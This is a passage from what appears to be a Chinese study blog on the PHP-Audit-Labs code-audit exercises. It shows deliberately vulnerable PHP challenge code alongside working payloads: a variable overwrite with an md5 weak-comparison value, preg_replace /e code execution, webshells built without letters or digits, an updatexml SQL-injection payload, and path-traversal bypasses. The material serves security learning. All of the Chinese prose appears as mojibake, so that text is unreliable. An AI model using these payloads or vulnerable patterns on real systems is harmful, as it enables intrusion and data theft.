alt></p><blockquote><p>parse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚</p></blockquote><p>æ‰€ä»¥æ­¤å¤„å­˜åœ¨çš„å˜é‡é—®é¢˜å°±æ˜¯<code>parse_str()</code>å¤„ç†äº†æˆ‘ä»¬å¯æ§çš„å‚æ•°å,æ˜¯å¯ä»¥èµ·åˆ°æ§åˆ¶å…¨å±€å˜é‡çš„æ•ˆæœçš„ã€‚å› æ­¤å¯ä»¥æ§åˆ¶<code>$config</code>å˜é‡åŠå…¶å¯¹åº”çš„å‚æ•°ã€‚è¾¾æˆå˜é‡è¦†ç›–ã€‚</p><p>è§£å†³è¿™ç±»å˜é‡è¦†ç›–é—®é¢˜çš„æœ€å¥½æ–¹æ³•è¿˜æ˜¯é€šè¿‡æ£€æŸ¥æŸä¸€å˜é‡æ˜¯å¦å·²ç»è®¾å®šè¿‡äº†(<code>isset()</code>)ã€‚è¿™æ ·åœ¨æ²¡æœ‰è®¾å®šè¿‡å˜é‡çš„elseåˆ†æ”¯æ‰èƒ½å®‰å…¨ä½¿ç”¨<code>parse_str()</code></p><h3 id="ç»ƒä¹ -6"><a href="#ç»ƒä¹ -6" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = â€œhongriâ€;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@parse_str($id);</span><br><span class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="uploadsomething.php"&gt;flag is here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($referer)!== <span class="keyword">false</span>) &#123;</span><br><span class="line">    $savepath = <span class="string">"uploads/"</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">"/"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask = umask(<span class="number">0</span>);</span><br><span class="line">        mkdir($savepath, <span class="number">0777</span>);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">        $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">        $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">        $content = <span class="string">"Too slow!"</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action="" method="get"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputEmail1"&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="filename" id="exampleInputEmail1" placeholder="Filename"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputPassword1"&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="content" id="exampleInputPassword1" placeholder="Contont"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" class="btn btn-default"&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can not see this page'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªæ¯”è¾ƒåˆ»æ„çš„<code>parse_str()</code>å˜é‡è¦†ç›–çš„ç”¨ä¾‹ã€‚åªè¦è§£å†³md5å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;a[0]&#x3D;s878926199a</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ†å…ˆæ˜¯æ³¨æ„ä¸€ä¸ªrefererå¤´è¦å¸¦ä¸Šã€‚ä¹‹åå°±æ˜¯ä¸€ä¸ªè¯»flagçš„é—®é¢˜äº†ã€‚å› ä¸ºflagçš„å†…å®¹ä¼šåœ¨æŒ‚èµ·0.1sç„¶åè¢«æ›¿æ¢æ‰ã€‚æ‰€ä»¥éœ€è¦æˆ‘ä»¬å»æ¡ä»¶ç«äº‰ã€‚å½“ç„¶è¿™é‡Œä¸Šä¼ ç›®å½•æ˜¯å›ºå®šçš„ã€‚æ‰€ä»¥å°±å¯ä»¥æ”¾å¿ƒå‘åŒ…äº†ã€‚</p><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/9.png" class="lazyload" data-srcset="9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ˜¯ä¸€ä¸ªè‡ªå·±åˆšäº†è§£CTFä¸ä¹…æ—¶æ¥è§¦çš„ä¸€ä¸ª<code>preg_replace()</code>åœ¨<code>/e</code>ä¸‹å­˜åœ¨ä»£ç æ‰§è¡Œçš„æ¼æ´äº†ã€‚å½“ç„¶è¿™ä¸ªæ´æ˜¯php5.5ç‰ˆæœ¬çš„</p><p>æˆ‘ä»¬çš„å‚æ•°å¯ä»¥æ§åˆ¶preg_replaceçš„ç¬¬ä¸€ï¼Œä¸‰ä¸ªå‚æ•°ã€‚è¾¾æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>ç„¶åå½“æ—¶ä¹Ÿæ˜¯è¯»åˆ°ä¸€ç¯‡æ–‡ç« ä¸“é—¨è®²åˆ°è¿™é‡Œpayloadçš„æ„é€ <br>åŸæœ¬å®˜æ–¹çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœGETè¯·æ±‚çš„å‚æ•°åå­˜åœ¨éæ³•å­—ç¬¦ï¼ŒPHPä¼šå°†å…¶æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œå³<code>.*</code> ä¼šå˜æˆ <code>_*</code><br>è€Œå®é™…å¯è¡Œçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><h3 id="ç»ƒä¹ -7"><a href="#ç»ƒä¹ -7" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not Allowed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å·²ç»å¸ç©ºè§æƒ¯çš„æ— æ•°å­—å­—æ¯webshellä¹¦å†™äº†</p><p>ç•™ä¸€ä¸ªFUZZè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = str_split(<span class="string">'getFlag'</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++)&#123;</span><br><span class="line">    $ch = <span class="string">'&#123;'</span>^ chr($i);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ch, $a , <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123; ^ chr("</span>.$i.<span class="string">") = $ch&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;&#123;&#123;&#123;&#123;&#123;&#123;"</span>^chr(<span class="number">28</span>).chr(<span class="number">30</span>).chr(<span class="number">15</span>).chr(<span class="number">61</span>).chr(<span class="number">23</span>).chr(<span class="number">26</span>).chr(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$å“¼&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$å“¼();</span><br></pre></td></tr></table></figure><p>ä¸Šæ¬¡åš36dçš„æŸé“é¢˜è‡ªå·±ç”¨äº†æœ€æé™çš„æ— æ•°å­—å­—æ¯ä¸”ä¸èƒ½å¼‚æˆ–å–åçš„webshellã€‚ä¹Ÿå°±æ˜¯é€šé…ç¬¦åŠ ä¸Šphpä¸´æ—¶æ–‡ä»¶å‘½ä»¤æ‰§è¡Œã€‚é‚£ä¸ªåº”è¯¥ç®—æ˜¯æ¯”è¾ƒéš¾ç”¨çš„ï¼Œä½†å¯ä»¥è§£å†³å¤§éƒ¨åˆ†wafäº†</p><h2 id="Day9"><a href="#Day9" class="headerlink" title="Day9"></a>Day9</h2><h3 id="str-replace-è¿‡æ»¤ä¸å½“"><a href="#str-replace-è¿‡æ»¤ä¸å½“" class="headerlink" title="str_replace()è¿‡æ»¤ä¸å½“"></a>str_replace()è¿‡æ»¤ä¸å½“</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/10.png" class="lazyload" data-srcset="10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„è¿‡æ»¤å‡½æ•°é—®é¢˜ã€‚å®ƒåªæ˜¯å°†<code>../</code>æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½ä½¿ç”¨<code>....//</code>è¿›è¡ŒåŒå†™ç»•è¿‡<br>ç„¶åå°±æ˜¯<code>require_once()</code>çš„æ–‡ä»¶åŒ…å«äº†ã€‚</p><p>CMSå®ä¾‹å°±æ˜¯é€ æˆè·¯å¾„ç©¿è¶Š,å¾—åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>å½“ç„¶åŒå†™/urläºŒæ¬¡ç¼–ç è¿›è¡Œè·¯å¾„ç©¿è¶Šçš„æŠ€å·§å…¶å®ä¹Ÿç®—å¾ˆå¸¸è§äº†ã€‚</p><h3 id="ç»ƒä¹ -8"><a href="#ç»ƒä¹ -8" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/ index.php</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername,$username,$password,$dbname);</span><br><span class="line"><span class="keyword">if</span>($conn-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'è¿æ¥æ•°æ®åº“å¤±è´¥'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $id = $row[<span class="string">'COUNT(*)'</span>] + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]) &amp;&amp; $_POST[<span class="string">'msg'</span>] !==<span class="string">''</span>)&#123;</span><br><span class="line">    $msg = addslashes($_POST[<span class="string">'msg'</span>]);</span><br><span class="line">    $msg = replace_bad_word(convert($msg));</span><br><span class="line">    $sql = <span class="string">"INSERT INTO users VALUES($id,'"</span>.$msg.<span class="string">"')"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($conn-&gt;error) <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type="text" name="msg" /&gt;&lt;input type="submit" value="Submit" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_row())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $limit_words;</span><br><span class="line">    <span class="keyword">foreach</span> ($limit_words <span class="keyword">as</span> $old =&gt; $new) &#123;</span><br><span class="line">        strlen($old) &gt; <span class="number">2</span> &amp;&amp; $str = str_replace($old,trim($new),$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$limit_words = <span class="keyword">array</span>(<span class="string">'é€ å'</span> =&gt; <span class="string">'é€ **'</span>, <span class="string">'æ³•è½®åŠŸ'</span> =&gt; <span class="string">'æ³•**'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$method <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>// config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"hongrisec"</span>;</span><br><span class="line">$password = <span class="string">"hongrisec"</span>;</span><br><span class="line">$dbname = <span class="string">"day9"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># æ­å»ºCTFç¯å¢ƒä½¿ç”¨çš„sqlè¯­å¥</span></span><br><span class="line">create database day9;</span><br><span class="line"><span class="keyword">use</span> <span class="title">day9</span>;</span><br><span class="line">create table users(</span><br><span class="line">id integer auto_increment not <span class="keyword">null</span> primary key,</span><br><span class="line">message varchar(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line">create table flag( flag varchar(<span class="number">40</span>));</span><br><span class="line">insert into flag values(<span class="string">'HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'</span>);</span><br></pre></td></tr></table></figure><p>å¯æ§çš„msgå˜é‡è¢«æ‹¼æ¥è¿›sqlè¯­å¥ã€‚ä½†æ˜¯å´ç»è¿‡äº†htmlå®ä½“ç¼–ç ,è½¬ä¹‰,è¿‡æ»¤ä¸ªåˆ«è¯çš„æ“ä½œã€‚</p><p>ä¸è¿‡,åœ¨function.phpå´å­˜åœ¨å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–æ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–<code>$limit_words</code>æ•°ç»„ï¼Œæ¥é€ƒé€¸å•å¼•å·.</p><p>æœ€åpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br></pre></td></tr></table></figure><h2 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h2><h3 id="ç¨‹åºåˆ¤é”™æœªexit"><a href="#ç¨‹åºåˆ¤é”™æœªexit" class="headerlink" title="ç¨‹åºåˆ¤é”™æœªexit()"></a>ç¨‹åºåˆ¤é”™æœªexit()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/11.png" class="lazyload" data-srcset="11.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œçš„é—®é¢˜ä¸»è¦æ˜¯:ä»£ç è™½ç„¶æœ‰ç›¸åº”çš„é˜²å¾¡æ“ä½œï¼Œä½†æ˜¯ç¨‹åºæœªç«‹å³åœæ­¢é€€å‡ºï¼Œå¯¼è‡´ç¨‹åºç»§ç»­æ‰§è¡Œçš„é—®é¢˜</p><p>æ­¤å¤„<code>extract()</code>å¾—åˆ°äº†ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨<br>åŠ ä¸Š<code>assert()</code>ï¼Œæ‰€ä»¥piå˜é‡ç›´æ¥ç»™webshellä»£ç å³å¯</p><p>æˆ‘ä¸ªäººä¸€æ¬¡ä½“éªŒæ¯”è¾ƒæ·±çš„ç»å†æ˜¯:åœ¨htbçš„æŸä¸ªé¶æœºä¸­ã€‚æœ‰ä¸€å¤„phpä»£ç ä¸­æ›¾ç»é™å®šåªæœ‰æŒ‡å®šç”¨æˆ·è®¿é—®(æ£€æŸ¥session),æ‰ä¼šæ˜¾ç¤ºå…¶sshå¯†é’¥ã€‚è€Œæ­¤æ—¶æˆ‘ä»¬çš„æƒé™æ˜¯www-data.çœ‹ä¼¼æ— 